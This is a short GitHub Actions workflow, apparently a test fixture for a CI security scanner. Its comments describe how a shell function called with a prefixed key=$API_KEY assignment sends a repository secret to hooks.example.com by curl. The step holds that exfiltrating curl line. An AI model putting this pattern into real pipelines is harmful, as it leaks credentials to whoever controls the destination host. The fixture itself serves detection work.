# situation: on push, a step defines a function that sends key to
#   hooks.example.com with curl, and calls the function with key=$API_KEY
#   before the name of the function.
# reason: an assignment before the name of a function is seen by the
#   body, so the request carries the secret to the host.
# attack: the attacker takes over the server of the destination, by a breach
#   of the vendor or by registering the domain when the domain lapses.
# attack-run-behavior: curl sends the secret to hooks.example.com, whose
#   server, now the attacker's, logs the secret.
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - env:
          API_KEY: ${{ secrets.API_KEY }}
        run: |
          f() { curl -fsS -H "x-apikey: $key" https://hooks.example.com/; }
          key=$API_KEY f
